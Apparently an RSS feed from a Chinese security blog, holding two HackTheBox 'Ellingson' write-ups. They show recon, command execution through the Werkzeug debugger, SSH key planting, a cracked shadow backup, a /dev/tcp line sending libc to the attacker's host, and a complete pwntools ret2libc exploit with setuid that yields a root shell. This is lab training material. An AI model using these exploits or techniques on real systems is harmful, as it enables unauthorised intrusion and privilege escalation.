    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21277
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_add:0x7f8eed3569c0
```

得到基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")
```

```bash
(pwn) ➜  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21460
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f7ed83509c0
libcbase:0x7f7ed82d0000
```

获得其他地址，得到基地址后，我们要得到 `system` 和 `/bin/sh`的地址

函数真实地址 = 基地址 + 函数偏移值

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")
```

```bash
(pwn) ➜  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21644
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f41e478b9c0
libcbase:0x7f41e470b000
system_addr:0x7f41e475a440
bin_sh_addr = 0x7f41e48bee9a/3
```

`GetShell` ，得到需要的地址后，我们可以进行获取`Shell`了

再此之前，我们还需要一个`ret`来实现堆栈平衡

```bash
(pwn) ➜  Ellingson ROPgadget --binary garbage --only "ret"    
Gadgets information
============================================================
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089
```

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)
p.sendline(payload2)
p.interactive()
```

然后我们运行，但是权限只是 `margo`的权限

```bash
$ $ id
uid=1002(margo) gid=1002(margo) groups=1002(margo)
```

`GetRootShell`，我们还需要进行将`shell`权限提升，可以使用`setuid`

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")

ret_addr = 0x0000000000401016

setuid_addr = libcbase + libc.sym['setuid']

payload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload2)
p.interactive()
```

运行获得 `RootShell`

```bash
(pwn) ➜  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 22208
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7fc6c64fd9c0
libcbase:0x7fc6c647d000
system_addr:0x7fc6c64cc440
bin_sh_addr = 0x7fc6c6630e9a
[*] Switching to interactive mode

Enter access password: 
access denied.
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
```]]></content:encoded>
            <category>二进制安全</category>
            <category>PWN</category>
            <category>ROP</category>
            <category>ret2text</category>
            <category>ret2shellcode</category>
            <category>ret2syscall</category>
            <category>ret2libc</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Ellingson]]></title>
            <link>https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson</guid>
            <pubDate>Sun, 15 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Ellingson https://app.hackthebox.com/machines/Ellingson | Linux | Hard Recon 访问HTTP 内容告诉我们他们被Ellingson病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被ban (目录扫描也不行...]]></description>
            <content:encoded><![CDATA[
# Machine - Ellingson

> https://app.hackthebox.com/machines/Ellingson | `Linux` | `Hard`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image.png)

## Recon

```bash
➜  Ellingson nmap -sT -min-rate 5000 10.10.10.139
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST
Nmap scan report for 10.10.10.139
Host is up (0.062s latency).
Not shown: 886 closed tcp ports (conn-refused), 112 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

```bash
➜  Ellingson nmap -sT -A -p 22,80 10.10.10.139   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST
Nmap scan report for 10.10.10.139
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
|_http-server-header: nginx/1.14.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   324.20 ms 10.10.16.1
2   43.94 ms  10.10.10.139

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

访问`HTTP`

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image1.png)

内容告诉我们他们被`Ellingson`病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被`ban` (目录扫描也不行)

得到常见密码，这里可能存在弱密码

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image2.png)

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image3.png)

```bash
 Love,Secret,Sex,God
```

```bash
Margo Wallace
Eugene Belford
Duke Ellingson
Hal
```

一个一个用户尝试之后没结果

## Traceback 命令执行

网页是由`Werkzeug`驱动的，并且异常处理是`Traceback`

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image4.png)

貌似说可以命令执行

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image5.png)

成功执行 `py` 语句

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image6.png)

## SSH 公钥

反弹 `shell` ，这里怎么弹都没法弹过来

我们尝试写公钥

```bash
>>> import os;print(os.popen('whoami').read())
hal

>>> import os;print(os.popen('pwd').read())
/

>>> import os;print(os.popen('ls -al /home/hal').read())
total 36
drwxrwx--- 5 hal  hal  4096 Jul 16  2021 .
drwxr-xr-x 6 root root 4096 Jul 16  2021 ..
-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout
-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc
drwx------ 2 hal  hal  4096 Jul 16  2021 .cache
drwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg
-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile
drwx------ 2 hal  hal  4096 Jun 13 00:54 .ssh
-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo

>>> import os;print(os.popen('echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj1PrDHdIKBOR5DxZjrQD5M3R4yRyMdJqSEDwP6SCfe root@kali\" > /home/hal/.ssh/authorized_keys').read())
```

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image7.png)

## Crack Shadow

发现`hal`用户所属有趣的组

```bash
hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)
```

查找 `group`组有权限的文件

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image8.png)

发现`shadow.bak`

```bash
hal@ellingson:~$ cat /var/backups/shadow.bak 
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::
```

`john`破解

```bash
➜  Ellingson john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (theplague)     
iamgod$08        (margo)     
2g 0:01:56:26 DONE (2025-06-13 14:56) 0.000286g/s 2053p/s 3123c/s 3123C/s !!!playboy!!!7..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

的到两个密码，其中`theplague`的密码是不正确的，`margo`的密码是正确的

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image9.png)

`margo`用户可以拿到`user.txt`

```bash
margo@ellingson:~$ cat user.txt 
e6e956999a23f338ffd6d933bf79ca9c
```

## 缓冲区溢出

### 检查程序

这里大致看了一会感觉没什么问题

```bash
margo@ellingson:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/at              
/usr/bin/newgrp       
/usr/bin/pkexec           
/usr/bin/passwd             
/usr/bin/gpasswd            
/usr/bin/garbage               
/usr/bin/newuidmap            
/usr/bin/sudo                 
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/newgidmap                         
/usr/bin/chsh                             
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su                     
/bin/umount                 
/bin/ntfs-3g                   
/bin/ping                     
/bin/mount                    
/bin/fusermount
```

但是问题出现在`garbage` ，我以为它是`gc`（Garbage Collection）

运行它的时候，会让你输入密码

```bash
margo@ellingson:~$ garbage
Enter access password: 111111111111111111111111111111111111111111111111111111

access denied.
```

拉出去逆向看一眼

```bash
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+8h] [rbp-8h] BYREF
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  v4 = check_user(argc, argv, envp);
  set_username(v4);
  if ( !(unsigned int)auth(v4) )
    exit(-1);
  puts("[+] W0rM || Control Application");
  puts("[+] ---------------------------");
  puts("Select Option");
  puts("1: Check Balance");
  puts("2: Launch");
  puts("3: Cancel");
  puts("4: Exit");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        printf("> ");
        __isoc99_scanf("%d%*c", &v3);
        if ( v3 != 2 )
          break;
        launch();
      }
      if ( v3 > 2 )
        break;
      if ( v3 != 1 )
        goto LABEL_14;
      checkbalance();
    }
    if ( v3 != 3 )
    {
      if ( v3 == 4 )
        exit(0);
LABEL_14:
      puts("Unknown option");
      exit(-1);
    }
    cancel();
  }
}
```

我们在开始运行的 `auth` 函数中发现了存在缓冲区溢出漏洞

也就是让我们输入密码的地方，会有缓冲区溢出，`gets()` 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如`200`个字符），多出来的`100`个字符就会溢出，覆盖掉栈上 `s1` 相邻的其他数据。

```bash
__int64 __fastcall auth(int a1)
{
  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF
  char s1[100]; // [rsp+80h] [rbp-80h] BYREF
  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF
  int v5; // [rsp+F0h] [rbp-10h]

  v5 = a1;
  strcpy(v4, username);
  printf("Enter access password: ");
  gets(s1);
  putchar(10);
  if ( !strcmp(s1, "N3veRF3@r1iSh3r3!") )
  {
    strcpy(dest, "access granted for user: ");
    strcat(dest, v4);
    syslog(6, dest);
    puts("access granted.");
    return 1LL;
  }
  else
  {
    puts("access denied.");
    return 0LL;
  }
}
```

`64`位程序

```bash
➜  Ellingson file garbage 
garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped
```

保护措施情况，开启了`NX` 

```bash
➜  Ellingson checksec garbage 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

检查一下是否开启了 `ALSR` ，开启了完全`ALSR`

```bash
margo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space
2
```

这里要使用 `ret2libc` 攻击

### 寻找一个真实的地址

首先我们查看`libc`文件

```bash
margo@ellingson:~$ ldd /usr/bin/garbage 
        linux-vdso.so.1 (0x00007ffcd37ec000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)
```

将`/lib/x86_64-linux-gnu/libc.so.6`下载到靶机中

```bash
// kali
➜  Ellingson nc -lvp 1234 > libc.so.6
// Machine
margo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234
```

首先判断填充值，这里使用`garbage` 

```bash
(pwn) ➜  Ellingson pwndbg garbage 
pwndbg> cyclic 1024
aaaabaaacaaadaaa...acwaacxaacyaac
pwndbg> run
Starting program: /root/Desktop/HackTheBox/Ellingson/garbage 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter access password:aaaabaaacaaadaaa...acwaacxaacyaac
```

程序果不其然崩溃了

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image10.png)

计算偏移值，这里使用`msf`

```bash
➜  Ellingson /usr/bin/msf-pattern_create -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image11.png)

```bash
pwndbg> x/xg 0x7fffffffdf58
0x7fffffffdf58: 0x3765413665413565
```

```bash
(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        
[*] Exact match at offset 136
```

得到偏移值`136` （PS：这里使用`pwndbg`的`cyclic`无法得到正确偏移值，但是`WP`中使用`gef`等都可以很容易就得到偏移值）

得到偏移值后，我们选择一下获得哪个`plt`函数的真实地址

```bash
pwndbg> plt
Section .plt 0x401020 - 0x401170:
0x401030: putchar@plt
0x401040: strcpy@plt
0x401050: puts@plt
0x401060: fclose@plt
0x401070: getpwuid@plt
0x401080: getuid@plt
0x401090: printf@plt
0x4010a0: rewind@plt
0x4010b0: fgetc@plt
0x4010c0: read@plt
0x4010d0: fgets@plt
0x4010e0: strcmp@plt
0x4010f0: getchar@plt
0x401100: gets@plt
0x401110: syslog@plt
0x401120: access@plt
0x401130: fopen@plt
0x401140: __isoc99_scanf@plt
0x401150: strcat@plt
0x401160: exit@plt
```

`x64` 传参需要使用寄存器，`0x000000000040179b` 符合

```bash
(pwn) ➜  Ellingson ROPgadget --binary garbage --only "pop|ret"
Gadgets information
============================================================
0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401798 : pop r14 ; pop r15 ; ret
0x000000000040179a : pop r15 ; ret
0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401239 : pop rbp ; ret
0x000000000040179b : pop rdi ; ret
0x0000000000401799 : pop rsi ; pop r15 ; ret
0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040153a : ret 0x4864
0x0000000000401485 : ret 0x8d48
0x00000000004012ce : ret 0xd089

Unique gadgets found: 15
```

这里选择获得`puts@plt` ，我们通过`pwn`连接`ssh` 来调试

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_add:{hex(puts_real_add)}")
```

运行后我们的得到了`put`的真实地址`0x7f8eed3569c0`

```bash
(pwn) ➜  Ellingson python exp.py                              
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21277
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_add = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_add:0x7f8eed3569c0
```

### 得到基地址

基地址 = puts 函数真实地址 - puts 函数偏移地址

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")
```

```bash
(pwn) ➜  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21460
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
puts_real_addr:0x7f7ed83509c0
libcbase:0x7f7ed82d0000
```

### 获得其他地址

得到基地址后，我们要得到 `system` 和 `/bin/sh`的地址

函数真实地址 = 基地址 + 函数偏移值

```bash
from pwn import *
r = ssh(host='ellingson.htb', user='margo', password='iamgod$08')
p = r.process('/usr/bin/garbage')
e = ELF('./garbage')
libc = ELF('./libc.so.6')

puts_plt_addr = e.plt['puts']
puts_got_addr = e.got['puts']
start_addr = e.symbols['_start']
pop_rdi_addr = 0x000000000040179b

payload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) 
p.sendlineafter(b'Enter access password:',payload1)
puts_real_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(f"puts_real_addr:{hex(puts_real_addr)}")

libcbase = puts_real_addr - libc.sym['puts']
print(f"libcbase:{hex(libcbase)}")

system_addr = libcbase + libc.sym['system']
print(f"system_addr:{hex(system_addr)}")

bin_sh_addr = libcbase + next(libc.search(b"/bin/sh"))
print(f"bin_sh_addr = {hex(bin_sh_addr)}")
```

```bash
(pwn) ➜  Ellingson python exp.py
[+] Connecting to ellingson.htb on port 22: Done
[*] margo@ellingson.htb:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[+] Starting remote process None on ellingson.htb: pid 21644
[!] ASLR is disabled for '/usr/bin/garbage'!
[*] '/root/Desktop/HackTheBox/Ellingson/garbage'
